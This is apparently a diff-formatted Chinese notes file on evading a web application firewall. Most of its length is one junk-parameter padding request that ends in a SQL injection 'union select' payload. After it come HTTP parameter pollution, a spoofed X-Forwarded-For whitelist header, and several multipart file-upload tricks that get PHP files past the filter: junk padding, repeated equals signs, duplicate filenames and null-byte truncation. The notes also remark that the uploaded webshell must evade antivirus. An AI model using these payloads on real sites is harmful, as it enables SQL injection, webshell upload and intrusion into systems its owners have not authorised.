TfrFs&VaweOGqUgy=burDOJUCwTWrYpIjoPHAy&dczuMKHNC=vtHWEjVdfluHXkdgpnxDbzUpm&XEvPexhJE=fTLlIwPxoLunfgqHYoPrE&afcARihJh=LdyZfBMqeQOlWXtAyhdyxsKx&nGdplVIWIZ=eaxGDoCfdMmTeRyrDDoATkGQH&kCrSD=txmXPFruOFrnMOZugddSXF&GMJooCmBF=PQYhihDJXneNSragkRnUJbD&PgNOkGtMxJM=pEbrxsQOBUnCnoEpuxgm&EWQaVND=yjCjXEhXznaOdMcGTCCknafyj&jQZYCA=REojoXWXNYpAmqJDIjkHMdp&iXJpAgBEMxQgJsP=DnJusjYazOunsQJgPZAG&FfjadCP=xqlEKpdsveBksboPGiCROVNk&hAUMWi=QahKuePLwWpiGslyfQuSql&csbDRcrcncX=LeBiKAOtSPFybyCPiHQsT&fzAcEMIS=whxQeOUxVNzYfwOsAMbxy&wRBGRlNhdVNTQ=HnDemTLxPWBwiLBIYtAEnbVA&cjuvHusfDcx=NSDOkUzIeNguMkRwBMkJCFjC&fhvzwAi=raZeFHTMRrOndwpalOPuSXP&
+&SbNooOTYQbTEHxO=ZtiQBRoSACoWKGcamEVFHZq&NDxZsoVfqa=ZavzEMQSJlThOZKXMSvdgJdp&ucgZtgo=PjaMvMzUTZnjZCbARiKIL&bhlceUjqevw=sAgmBnTmxwvKNRLqeVtm&FLlHTQsZVTlME=QrqwzkUNptSGbWhqNySqWoK&aeQiUF=QUgiiDgORZiXKLMyILKn&SyonC=wPysubrASxYiBCTnoRCpA&EaQUEoFg=etvcYuUJcnsOKlpEJczOYPpH&TNfWu=jtSGmojsUVJkuFNncnFfcFJiG&pTAeSguoLnlRk=uGiFOqOhHHxsoqBPaTnafmiv&WQWBsGGKj=WhBiIosbVUqgEkXnzmxkRj&LsKaxxxBSmk=ppmxMYsDwPsheIaqlaAZ&mIuwJQ=LNteorrxMbXbBdHotUDDNV&acaYWPcV=zRnrsurzmLBxKDSvpWCGfvwy&tWdllVTdSuZLK=YFzeFphCPagmLSOFWiEGq&cCggIh=ksVixgvDJTpsRQDPnloF&CAuYJaoDMc=UDYoZeLyUDBdTHMjkOFvGyJZZ&AbNwKVg=lmBFtweAxltcQXrIEgTZtOPl&khvLSfs=uQapOZTiOTLDzHlEMLjHxj&UxQVaNRgyQQVGEa=fqUvkwRECVSQTJsuwPbydyv&QUVceaFiMlDvv=NrdbYkXKURoYZxGxOXTCpli&LvChdQDvaJXpY=bBDTglWWSzFKmbGROsEIkwslj&YashN=YGbouDAbOqgnKExWFDygx&CLVdBJQj=ZpbqnhANZKoVQXydoVvJAGHg&phedABErrg=aryXAkSkyOGlLVGuUXFZKYYZA&fWKAQPpuZHgv=qhodwZDoDepiUrtuiAyfpv&ezJPxL=vOCYWPcLPtvDaJJozyZXU&janGXeJBEDz=dCcupMqvjNofTluMzdKoTfrFs&VaweOGqUgy=burDOJUCwTWrYpIjoPHAy&dczuMKHNC=vtHWEjVdfluHXkdgpnxDbzUpm&XEvPexhJE=fTLlIwPxoLunfgqHYoPrE&afcARihJh=LdyZfBMqeQOlWXtAyhdyxsKx&nGdplVIWIZ=eaxGDoCfdMmTeRyrDDoATkGQH&kCrSD=txmXPFruOFrnMOZugddSXF&GMJooCmBF=PQYhihDJXneNSragkRnUJbD&PgNOkGtMxJM=pEbrxsQOBUnCnoEpuxgm&EWQaVND=yjCjXEhXznaOdMcGTCCknafyj&jQZYCA=REojoXWXNYpAmqJDIjkHMdp&iXJpAgBEMxQgJsP=DnJusjYazOunsQJgPZAG&FfjadCP=xqlEKpdsveBksboPGiCROVNk&hAUMWi=QahKuePLwWpiGslyfQuSql&csbDRcrcncX=LeBiKAOtSPFybyCPiHQsT&fzAcEMIS=whxQeOUxVNzYfwOsAMbxy&wRBGRlNhdVNTQ=HnDemTLxPWBwiLBIYtAEnbVA&cjuvHusfDcx=NSDOkUzIeNguMkRwBMkJCFjC&fhvzwAi=raZeFHTMRrOndwpalOPuSXP&kbEnLgwYxJbzQu=ZoNZaLcqLIsZSzJMNKnFgXb&
+&SbNooOTYQbTEHxO=ZtiQBRoSACoWKGcamEVFHZq&NDxZsoVfqa=ZavzEMQSJlThOZKXMSvdgJdp&ucgZtgo=PjaMvMzUTZnjZCbARiKIL&bhlceUjqevw=sAgmBnTmxwvKNRLqeVtm&FLlHTQsZVTlME=QrqwzkUNptSGbWhqNySqWoK&aeQiUF=QUgiiDgORZiXKLMyILKn&SyonC=wPysubrASxYiBCTnoRCpA&EaQUEoFg=etvcYuUJcnsOKlpEJczOYPpH&TNfWu=jtSGmojsUVJkuFNncnFfcFJiG&pTAeSguoLnlRk=uGiFOqOhHHxsoqBPaTnafmiv&WQWBsGGKj=WhBiIosbVUqgEkXnzmxkRj&LsKaxxxBSmk=ppmxMYsDwPsheIaqlaAZ&mIuwJQ=LNteorrxMbXbBdHotUDDNV&acaYWPcV=zRnrsurzmLBxKDSvpWCGfvwy&tWdllVTdSuZLK=YFzeFphCPagmLSOFWiEGq&cCggIh=ksVixgvDJTpsRQDPnloF&CAuYJaoDMc=UDYoZeLyUDBdTHMjkOFvGyJZZ&AbNwKVg=lmBFtweAxltcQXrIEgTZtOPl&khvLSfs=uQapOZTiOTLDzHlEMLjHxj&UxQVaNRgyQQVGEa=fqUvkwRECVSQTJsuwPbydyv&QUVceaFiMlDvv=NrdbYkXKURoYZxGxOXTCpli&LvChdQDvaJXpY=bBDTglWWSzFKmbGROsEIkwslj&YashN=YGbouDAbOqgnKExWFDygx&CLVdBJQj=ZpbqnhANZKoVQXydoVvJAGHg&phedABErrg=aryXAkSkyOGlLVGuUXFZKYYZA&fWKAQPpuZHgv=qhodwZDoDepiUrtuiAyfpv&ezJPxL=vOCYWPcLPtvDaJJozyZXU&janGXeJBEDz=dCcupMqvjNofTluMzdKoTfrFs&VaweOGqUgy=burDOJUCwTWrYpIjoPHAy&dczuMKHNC=vtHWEjVdfluHXkdgpnxDbzUpm&XEvPexhJE=fTLlIwPxoLunfgqHYoPrE&afcARihJh=LdyZfBMqeQOlWXtAyhdyxsKx&nGdplVIWIZ=eaxGDoCfdMmTeRyrDDoATkGQH&kCrSD=txmXPFruOFrnMOZugddSXF&GMJooCmBF=PQYhihDJXneNSragkRnUJbD&PgNOkGtMxJM=pEbrxsQOBUnCnoEpuxgm&EWQaVND=yjCjXEhXznaOdMcGTCCknafyj&jQZYCA=REojoXWXNYpAmqJDIjkHMdp&iXJpAgBEMxQgJsP=DnJusjYazOunsQJgPZAG&FfjadCP=xqlEKpdsveBksboPGiCROVNk&hAUMWi=QahKuePLwWpiGslyfQuSql&csbDRcrcncX=LeBiKAOtSPFybyCPiHQsT&fzAcEMIS=whxQeOUxVNzYfwOsAMbxy&wRBGRlNhdVNTQ=HnDemTLxPWBwiLBIYtAEnbVA&cjuvHusfDcx=NSDOkUzIeNguMkRwBMkJCFjC&fhvzwAi=raZeFHTMRrOndwpalOPuSXP&kbEnLgwYxJbzQu=ZoNZaLcqLIsZSzJMNKnFgXb&uLYaRPFZoac=qKKZSxemvoEDnGMZFCxxl&
+&SbNooOTYQbTEHxO=ZtiQBRoSACoWKGcamEVFHZq&NDxZsoVfqa=ZavzEMQSJlThOZKXMSvdgJdp&ucgZtgo=PjaMvMzUTZnjZCbARiKIL&bhlceUjqevw=sAgmBnTmxwvKNRLqeVtm&FLlHTQsZVTlME=QrqwzkUNptSGbWhqNySqWoK&aeQiUF=QUgiiDgORZiXKLMyILKn&SyonC=wPysubrASxYiBCTnoRCpA&EaQUEoFg=etvcYuUJcnsOKlpEJczOYPpH&TNfWu=jtSGmojsUVJkuFNncnFfcFJiG&pTAeSguoLnlRk=uGiFOqOhHHxsoqBPaTnafmiv&WQWBsGGKj=WhBiIosbVUqgEkXnzmxkRj&LsKaxxxBSmk=ppmxMYsDwPsheIaqlaAZ&mIuwJQ=LNteorrxMbXbBdHotUDDNV&acaYWPcV=zRnrsurzmLBxKDSvpWCGfvwy&tWdllVTdSuZLK=YFzeFphCPagmLSOFWiEGq&cCggIh=ksVixgvDJTpsRQDPnloF&CAuYJaoDMc=UDYoZeLyUDBdTHMjkOFvGyJZZ&AbNwKVg=lmBFtweAxltcQXrIEgTZtOPl&khvLSfs=uQapOZTiOTLDzHlEMLjHxj&UxQVaNRgyQQVGEa=fqUvkwRECVSQTJsuwPbydyv&QUVceaFiMlDvv=NrdbYkXKURoYZxGxOXTCpli&LvChdQDvaJXpY=bBDTglWWSzFKmbGROsEIkwslj&YashN=YGbouDAbOqgnKExWFDygx&CLVdBJQj=ZpbqnhANZKoVQXydoVvJAGHg&phedABErrg=aryXAkSkyOGlLVGuUXFZKYYZA&fWKAQPpuZHgv=qhodwZDoDepiUrtuiAyfpv&ezJPxL=vOCYWPcLPtvDaJJozyZXU&janGXeJBEDz=dCcupMqvjNofTluMzdKoTfrFs&VaweOGqUgy=burDOJUCwTWrYpIjoPHAy&dczuMKHNC=vtHWEjVdfluHXkdgpnxDbzUpm&XEvPexhJE=fTLlIwPxoLunfgqHYoPrE&afcARihJh=LdyZfBMqeQOlWXtAyhdyxsKx&nGdplVIWIZ=eaxGDoCfdMmTeRyrDDoATkGQH&kCrSD=txmXPFruOFrnMOZugddSXF&GMJooCmBF=PQYhihDJXneNSragkRnUJbD&PgNOkGtMxJM=pEbrxsQOBUnCnoEpuxgm&EWQaVND=yjCjXEhXznaOdMcGTCCknafyj&jQZYCA=REojoXWXNYpAmqJDIjkHMdp&iXJpAgBEMxQgJsP=DnJusjYazOunsQJgPZAG&FfjadCP=xqlEKpdsveBksboPGiCROVNk&hAUMWi=QahKuePLwWpiGslyfQuSql&csbDRcrcncX=LeBiKAOtSPFybyCPiHQsT&fzAcEMIS=whxQeOUxVNzYfwOsAMbxy&wRBGRlNhdVNTQ=HnDemTLxPWBwiLBIYtAEnbVA&cjuvHusfDcx=NSDOkUzIeNguMkRwBMkJCFjC&fhvzwAi=raZeFHTMRrOndwpalOPuSXP&kbEnLgwYxJbzQu=ZoNZaLcqLIsZSzJMNKnFgXb&uLYaRPFZoac=qKKZSxemvoEDnGMZFCxxl&NIoZmQTnnVHSg=jeUWSMlFhOEJxMQnoSxR&
+&SbNooOTYQbTEHxO=ZtiQBRoSACoWKGcamEVFHZq&NDxZsoVfqa=ZavzEMQSJlThOZKXMSvdgJdp&ucgZtgo=PjaMvMzUTZnjZCbARiKIL&bhlceUjqevw=sAgmBnTmxwvKNRLqeVtm&FLlHTQsZVTlME=QrqwzkUNptSGbWhqNySqWoK&aeQiUF=QUgiiDgORZiXKLMyILKn&SyonC=wPysubrASxYiBCTnoRCpA&EaQUEoFg=etvcYuUJcnsOKlpEJczOYPpH&TNfWu=jtSGmojsUVJkuFNncnFfcFJiG&pTAeSguoLnlRk=uGiFOqOhHHxsoqBPaTnafmiv&WQWBsGGKj=WhBiIosbVUqgEkXnzmxkRj&LsKaxxxBSmk=ppmxMYsDwPsheIaqlaAZ&mIuwJQ=LNteorrxMbXbBdHotUDDNV&acaYWPcV=zRnrsurzmLBxKDSvpWCGfvwy&tWdllVTdSuZLK=YFzeFphCPagmLSOFWiEGq&cCggIh=ksVixgvDJTpsRQDPnloF&CAuYJaoDMc=UDYoZeLyUDBdTHMjkOFvGyJZZ&AbNwKVg=lmBFtweAxltcQXrIEgTZtOPl&khvLSfs=uQapOZTiOTLDzHlEMLjHxj&UxQVaNRgyQQVGEa=fqUvkwRECVSQTJsuwPbydyv&QUVceaFiMlDvv=NrdbYkXKURoYZxGxOXTCpli&LvChdQDvaJXpY=bBDTglWWSzFKmbGROsEIkwslj&YashN=YGbouDAbOqgnKExWFDygx&CLVdBJQj=ZpbqnhANZKoVQXydoVvJAGHg&phedABErrg=aryXAkSkyOGlLVGuUXFZKYYZA&fWKAQPpuZHgv=qhodwZDoDepiUrtuiAyfpv&ezJPxL=vOCYWPcLPtvDaJJozyZXU&janGXeJBEDz=dCcupMqvjNofTluMzdKoTfrFs&VaweOGqUgy=burDOJUCwTWrYpIjoPHAy&dczuMKHNC=vtHWEjVdfluHXkdgpnxDbzUpm&XEvPexhJE=fTLlIwPxoLunfgqHYoPrE&afcARihJh=LdyZfBMqeQOlWXtAyhdyxsKx&nGdplVIWIZ=eaxGDoCfdMmTeRyrDDoATkGQH&kCrSD=txmXPFruOFrnMOZugddSXF&GMJooCmBF=PQYhihDJXneNSragkRnUJbD&PgNOkGtMxJM=pEbrxsQOBUnCnoEpuxgm&EWQaVND=yjCjXEhXznaOdMcGTCCknafyj&jQZYCA=REojoXWXNYpAmqJDIjkHMdp&iXJpAgBEMxQgJsP=DnJusjYazOunsQJgPZAG&FfjadCP=xqlEKpdsveBksboPGiCROVNk&hAUMWi=QahKuePLwWpiGslyfQuSql&csbDRcrcncX=LeBiKAOtSPFybyCPiHQsT&fzAcEMIS=whxQeOUxVNzYfwOsAMbxy&wRBGRlNhdVNTQ=HnDemTLxPWBwiLBIYtAEnbVA&cjuvHusfDcx=NSDOkUzIeNguMkRwBMkJCFjC&fhvzwAi=raZeFHTMRrOndwpalOPuSXP&kbEnLgwYxJbzQu=ZoNZaLcqLIsZSzJMNKnFgXb&uLYaRPFZoac=qKKZSxemvoEDnGMZFCxxl&NIoZmQTnnVHSg=jeUWSMlFhOEJxMQnoSxR&nLTzySDMcuGzZ=YukpBCjUyeOtGlgpRqodLLRV&id=-1'%20union%20select%20user(),2--+&Submit=Submit
+----------------1e------------------
+成功绕过.
+
+
+3.分块传输：
+直接使用分块传输的burp插件即可.
+
+4.参数污染：
+如：
+id=343544565676767545&id=-1'%20union%20select%201,2--+&Submit=Submit
+不一定行.
+
+
+5.修改客户端ip(白名单)：
+X-Forwarded-For: 127.0.0.1
+
+
+
+
+文件上传bypass：
+文件上传bypass waf：
+1.填充垃圾字符：
+如：
+Content-Disposotion: form-data;大量垃圾字符;name="uploaded";filename="testz.php"
+-------------1s------------------------------------
+------WebKitFormBoundaryVLBVQJOqjPIVcvX6
+Content-Disposition: form-data; name="uploaded";35427个z字符;filename="pwqz8.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();?>
+------WebKitFormBoundaryVLBVQJOqjPIVcvX6
+---------------------1e-------------------------------
+成功绕过.
+
+
+2.文件名增加多个等号：
+name="uploaded";filename==="testz.php"
+eg2:
+--------------1s-----------
+------WebKitFormBoundaryVLBVQJOqjPIVcvX6
+Content-Disposition: form-data; name="uploaded";filename==="pwqz983.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();?>
+------WebKitFormBoundaryVLBVQJOqjPIVcvX6
+---------------1e----------
+成功绕过，上传成功.
+
+
+
+
+
+
+3.参数污染：
+filename=;filename="testz.php"
+如：
+Content-Disposotion: form-data;name="uploaded";filename=;filename="testz.php"
+
+------------1s---------------------
+------WebKitFormBoundaryVLBVQJOqjPIVcvX6
+Content-Disposition: form-data; name="uploaded";filename=;filename="pwqz98363.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();?>
+------WebKitFormBoundaryVLBVQJOqjPIVcvX6
+----------------1e---------------------
+成功绕过.
+
+
+
+4. 00%截断：
+最好统一使用16进制来设置00截断.
+如：
+filename=;filename="testqz.phpwzk"
+hex下将w字符对应的hex改为00
+成功绕过，上传成功.
+上传保存的实际文件为testqz.php
+
+或者：
+filename=;filename="testz.phpw"
+hex下将w字符对应的hex改为00也行.
+
+原理：00%一般表示空字符，一般表示结束.
+经测试：00%截断可以绕过安全狗，但必须是一个免杀马，不然即使上传成功，执行也会被安全狗拦截.
+
+
